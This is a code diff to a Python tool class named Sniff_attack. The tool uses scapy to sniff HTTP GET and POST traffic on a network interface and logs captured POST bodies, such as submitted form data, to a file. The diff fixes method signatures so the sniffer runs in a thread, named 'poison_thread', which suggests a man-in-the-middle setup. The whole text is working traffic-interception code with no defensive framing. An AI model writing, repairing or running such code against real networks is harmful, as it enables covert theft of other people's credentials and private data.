@@ -6,7 +6,7 @@ class Sniff_attack:
         self.fakeurl = ""
         self.interface = ""
   
-    def sniffData(pkt):
+    def sniffData(self,pkt):
         if pkt.haslayer( Raw ):
             header = pkt.getlayer( Raw ).load
             if header.startswith(bytes('GET', 'utf-8')) or header.startswith(bytes('POST', 'utf-8')):
@@ -29,9 +29,9 @@ class Sniff_attack:
                             data = header.split(bytes('\r\n\r\n','utf-8'))[1]
                             print(("[%s] POST data Captured: %s" % (src, data)), file=open("packets.txt", "a"))
                             print('------------------------------------', file=open("packets.txt", "a"))
-    def startSniff():
-        sniff(iface=self.interface, prn=sniffData)
-    def launchSniff():
-        poison_thread = threading.Thread(target=startSniff, args=())
+    def startSniff(self):
+        sniff(iface=self.interface, prn=self.sniffData)
+    def launchSniff(self):
+        poison_thread = threading.Thread(target=self.startSniff, args=())
         poison_thread.deamon = True
         poison_thread.start()
